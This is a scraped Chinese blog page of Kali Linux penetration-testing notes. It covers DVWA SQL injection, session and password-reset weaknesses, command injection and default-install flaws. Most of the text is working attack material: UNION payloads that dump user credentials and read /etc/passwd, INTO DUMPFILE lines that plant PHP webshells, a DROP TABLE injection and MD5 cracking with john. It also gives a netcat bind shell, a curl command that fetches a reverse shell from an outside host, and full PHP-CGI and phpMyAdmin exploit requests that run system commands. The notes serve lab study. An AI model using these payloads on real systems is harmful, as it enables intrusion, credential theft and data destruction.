-<li>Dvwa库中的表名<ul>
-<li>‘union select table_name,table_schema from information_schema.tables where table_schema=’dvwa’–+</li>
-</ul>
-</li>
-<li>Users表中的所有列（user_id,first_name,last_name,user,password,avatar）<ul>
-<li>‘union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’–+</li>
-</ul>
-</li>
-<li>查询user、password列的内容<ul>
-<li>‘union select users,password from dvwa,users–+</li>
-<li>‘union select users,password from users–+</li>
-<li>‘union select null,concat(user,0x3a,password) from users–+ </li>
-</ul>
-</li>
-</ul>
-<h4 id="2-密码猜测"><a href="#2-密码猜测" class="headerlink" title="2. 密码猜测"></a>2. 密码猜测</h4><ul>
-<li>hash-identifier<ul>
-<li>输入猜测的值</li>
-</ul>
-</li>
-<li>密码破解<ul>
-<li>username:passhash–&gt;dvwa.txt</li>
-<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt</code></strong>（存在./john文件）</li>
-</ul>
-</li>
-<li>显示之前破解的密码<ul>
-<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt --show</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-系统文件读取-命令执行"><a href="#3-系统文件读取-命令执行" class="headerlink" title="3. 系统文件读取/命令执行"></a>3. 系统文件读取/命令执行</h4><ul>
-<li>读取文件<ul>
-<li>‘union select null,load_file(‘/etc/passwd’)–+</li>
-</ul>
-</li>
-<li>写入文件（原文件形式）<ul>
-<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “a.php”–+（dumpfile到默认目录，默认目录只有mysql有权限）</li>
-<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “/var/www/a.php”–+（dumpfile到指定目录）</li>
-<li><ul>
-<li>▲ 脚本可以写到具有777权限的/tmp目录，结合SQL注入和File Inclusion达到作用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>写入文件（十六进制模式）<ul>
-<li><strong><code>🔺命令：cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</code></strong></li>
-<li><strong><code>🔺命令：cat php-reverse-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></strong>（▲ 十六进制编码的shell）</li>
-<li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
-<li>可能受到服务器GET大小的限制，传输不成功</li>
-</ul>
-</li>
-<li>保存下载数据库<ul>
-<li>‘union select null,concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–+</li>
-</ul>
-</li>
-<li>一个思路：编写服务器端代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name = $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username = $_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot; value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-猜字段–无information-schema"><a href="#4-猜字段–无information-schema" class="headerlink" title="4. 猜字段–无information_schema"></a>4. 猜字段–无information_schema</h4><ul>
-<li>无权读取information_schema库/拒绝union、order by语句<ul>
-<li>猜列名：’and column is null–+（Burpsuite自动猜列名）</li>
-<li>猜当前表表名：’and table.user is null–+</li>
-<li>猜库里其他表：’and (select count(*) from table)&gt;0–+</li>
-<li>列表对应关系：’and users.user is null–+</li>
-<li>猜字段内容：’or user=’admin/‘or user like ‘%a%</li>
-<li>猜账号对应密码：’or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99（MD5值）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐之前的SQL注入教程，主要是针对mysql的root权限，如果得到的是mysql的一个普通用户的权限，则很难通过information_schema来查询以及执行指令
-⭐查找column字典
-find / -name *column*.txt
-cat /usr/share/golismero/tools/sqlmap/txt/common-colums.txt | gerp -v ^# &gt; column.txt
-⭐查找table表名
-find / -name *.table*.txt
-cat /usr/share/golismero/tools/sqlmap/txt/common-table.txt | gerp -v ^# &gt;table.txt
-⭐MD5作为字典
-md5sum common-password.txt password.txt</code></pre></blockquote>
-<h4 id="5-用户注入–无information-schema"><a href="#5-用户注入–无information-schema" class="headerlink" title="5. 用户注入–无information_schema"></a>5. 用户注入–无information_schema</h4><ul>
-<li>‘;update users set user=’yuanfh’ where user=’admin’<ul>
-<li>注入失败，sql客户端工具的问题</li>
-<li><a href="http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</a></li>
-</ul>
-</li>
-<li>‘;INSERT into users(‘user_id’,’first_name’,’last_name’,’user’,’password’,’avatar’)VALUES(‘35’,’fh’,’yuan’,’yfh’,’5f4dcc3b5aa765d61d8327deb882cf99’,’OK’);–+</li>
-<li>‘;DROP TABLE users;–+</li>
-<li>xp_cmdshell /存储过程</li>
-<li>▲ SQLi没有通用的方法，掌握原理，了解各种数据库特性 </li>
-</ul>
-<h4 id="6-DVWA的SQL注入源码"><a href="#6-DVWA的SQL注入源码" class="headerlink" title="6. DVWA的SQL注入源码"></a>6. DVWA的SQL注入源码</h4><ul>
-<li>Dvwa的SQL Injection Source（Low）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Dvwa的SQL Injection Source（Medium）<ul>
-<li>对特殊字符的转义</li>
-<li>mysql_real_escape_srting()（PHP 4 &gt;=4.3.0，PHP5）</li>
-<li>PHP 5.5.0已经启用此函数</li>
-<li>PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_M有、SQL</li>
-<li>转义字符（\x00、\n、\r、’、”、\x1a）</li>
-<li>▲ 绕过方法：不需要单引号，不需要–，直接插入语句即可</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">    </span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Dvwa的SQL Injection Source（High）<ul>
-<li>stripslashes（去除”&quot;）</li>
-<li>mysql_real_escape_string</li>
-<li>▲ is_numric（判断是否为数字）</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" itemprop="url">Kali Linux笔记(四十五)：手动漏洞挖掘--身份认证、SessionID、密码找回、命令执行</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-手动漏洞挖掘–身份认证"><a href="#1-手动漏洞挖掘–身份认证" class="headerlink" title="1. 手动漏洞挖掘–身份认证"></a>1. 手动漏洞挖掘–身份认证</h4><ul>
-<li>常用弱口令/基于字典的密码爆破</li>
-<li>锁定账号（密码锁定机制，尝试密码次数过多）</li>
-<li>信息收集<ul>
-<li>手机号（大部分手机号/邮箱号）</li>
-<li>页面返回errorcode（界面不显示errorcode）</li>
-<li>密码错误提示信息（猜测四位手机号，185xxxx4465）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐密码错误提示信息
-1.登录失败（安全性较高）
-2.用户名不存在
-3.密码错误</code></pre></blockquote>
-<ul>
-<li>密码嗅探</li>
-</ul>
-<h4 id="2-手动漏洞挖掘–会话sessionID"><a href="#2-手动漏洞挖掘–会话sessionID" class="headerlink" title="2. 手动漏洞挖掘–会话sessionID"></a>2. 手动漏洞挖掘–会话sessionID</h4><ul>
-<li>XSS/Cookie importer</li>
-<li>SessionID in URL（SessionID可以存在机器本地，也可存放在内存）</li>
-<li>嗅探</li>
-<li>SessionID长期不变/永久不变</li>
-</ul>
-<blockquote>
-<pre><code>▲ SessionID注入浏览器：
-1.获取其他机子的SessionID
-2.通过Cookie Manager过滤，编辑SessionID
-3.1.登出进行测试，后退是否能返回（SessionID可能不是活动状态，但可能永久不变）
-3.2.关闭浏览器，重新访问，替换SessionID，可能可以进行访问，SessionID固定不变</code></pre></blockquote>
-<ul>
-<li>SessionID生成算法<ul>
-<li>Sequencer</li>
-<li>私有算法</li>
-<li>预判下一次登陆时生成的SessionID（可能根据时间进行哈希计算作为SessionID）</li>
-<li>登出后返回测试</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-手动漏洞挖掘–密码找回"><a href="#3-手动漏洞挖掘–密码找回" class="headerlink" title="3. 手动漏洞挖掘–密码找回"></a>3. 手动漏洞挖掘–密码找回</h4><ul>
-<li><a href="https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514" target="_blank" rel="noopener">https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514</a></li>
-</ul>
-<blockquote>
-<pre><code>密码找回步骤：
-1.界面点击忘记密码按钮
-2.根据提示输入原密码邮箱等信息，点击发送邮件按钮
-3.服务器发送邮件到客户端邮箱
-4.打开邮件，邮件里面的链接可以进行密码重设（key值）
-▲ 链接的key值字符串，可能为邮箱账号进行md5运算(128位)或是sha-1(160位)或是sha-2(256位)</code></pre></blockquote>
-<h4 id="4-手动漏洞挖掘–命令执行"><a href="#4-手动漏洞挖掘–命令执行" class="headerlink" title="4. 手动漏洞挖掘–命令执行"></a>4. 手动漏洞挖掘–命令执行</h4><ul>
-<li>漏洞挖掘原则<ul>
-<li>所有变量（攻击注入手段）</li>
-<li>所有头（Cookie中的变量）</li>
-<li>逐个变量删除（Cookie还是body中的字段让服务器进行判断）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>DVWA命令执行漏洞/exec:header和body进行删除，需要对一些符号进行URL encode</code></pre></blockquote>
-<ul>
-<li>漏洞的本质<ul>
-<li>数据与指令的混淆</li>
-<li>对用户输入信息过滤不严判断失误，误将指令当数据</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐low：DVWA命令执行漏洞/exec
-1.如果是操作系统命令操作，而不是Web Application进行操作，可以进行命令行尝试
-2.查看Command Execution Source，发现没有对&apos;&amp;&amp;&apos;和&apos;;&apos;进行过滤
-⭐medium：DVWA命令执行漏洞/exec
-1.查看Command Execution Source，发现没有对&apos;&amp;&amp;&apos;和&apos;;&apos;进行过滤
-2.操作系统shell命令的熟悉程度，没有对&apos;&amp;&apos;和&apos;|&apos;进行过滤
-⭐high：DVWA命令执行漏洞/exec
-1.查看Command Execution Source，发现过滤很严格，先对字符串进行处理ip地址，然后对输入的内容进行&apos;.&apos;分割的成4段，然后再判断这4段是不是都是数字，如果是，则进行运行命令</code></pre></blockquote>
-<ul>
-<li>命令执行<ul>
-<li>应用程序开发者直接调用操作系统功能</li>
-<li>; &amp;&amp; | || &amp;</li>
-<li>查看源代码，过滤用户输入</li>
-<li>;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe</li>
-</ul>
-</li>
-<li>;curl <a href="http://1.1.1.1/php-revers-shell.php" target="_blank" rel="noopener">http://1.1.1.1/php-revers-shell.php</a></li>
-</ul>
-<blockquote>
-<pre><code>⭐curl下载执行php，反弹shell
-Kali
-1.cp /usr/share/webshells/php/php-reverse-shell.php /var/www/htmp/1.php
-2.启动apache2，services apache2 start
-3.编辑php-revers-shell.php的反弹IP地址 → Kali地址
-DVWA：
-1.;curl http://Kali IP地址/1.php
-▲ 结果返回的是Kali的shell，因为1.php在Kali上，所以只能返回Kali本机的shel
-
-⭐curl应用（控制肉鸡隐蔽性）
-1.三台机器，一台Kali，开启1234端口；一台服务器DVWA；一台肉鸡，有反弹shell的php
-2.kali发送;curl命令给DVWA，DVWA进行curl
-3.肉鸡上的反弹php返回一个shell给kali</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/" itemprop="url">Kali Linux笔记(四十四)：手动漏洞挖掘--默认安装存在漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-问答"><a href="#1-问答" class="headerlink" title="1. 问答"></a>1. 问答</h4><ul>
-<li>Conky（性能监测工具）<ul>
-<li><a href="https://weather.yahoo.com/（城市代码）" target="_blank" rel="noopener">https://weather.yahoo.com/（城市代码）</a></li>
-<li>.conkyrc（Beijing：2151330）</li>
-</ul>
-</li>
-<li>Goagent<ul>
-<li>不要启动多次</li>
-<li>Win+M</li>
-</ul>
-</li>
-<li>Linux4.4内核发布，在虚拟机中可使用主机上的GPU</li>
-</ul>
-<h4 id="2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功"><a href="#2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功" class="headerlink" title="2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功"></a>2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功</h4><ul>
-<li>Windows默认安装漏洞</li>
-<li>phpMyAdmin/setup（可以不需要账号密码直接访问）</li>
-<li>Ubuntu/Debian默认安装PHP5-cgi（php位于/usr/bin目录下）</li>
-<li>可直接访问/cgi-bin/php5和/cgi-bin/php（爬不出来的目录）</li>
-</ul>
-<blockquote>
-<pre><code>⭐phpMyAdmin → 通过Burpsuite进行重放（正向）：
-POST http://ip地址/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
-Host:ip地址
-
-&lt;?php 
-passthru(&quot;id/ls/echo &quot;adadsadas&quot; &gt;&gt; a.php&quot;);
-die();
-?&gt;
-
-⭐PHP5-cgi → 通过Burpsuite进行重放（正向）：
-POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
-Host：123
-
-&lt;?php
-    echo system(&apos;cat /etc/passwd&apos;);
-?&gt;
-▲ exec()函数执行命令时，如&apos;cat /etc/passwd&apos; 只返回最后一行的内容
-▲ host无作用，但因为请求头需要host
-
-⭐PHP5-cgi → 通过Burpsuite进行重放（网页主动打开一个侦听端口）：
-POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
-Host：123
-
-&lt;?php
-    echo system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);
-?&gt;</code></pre></blockquote>
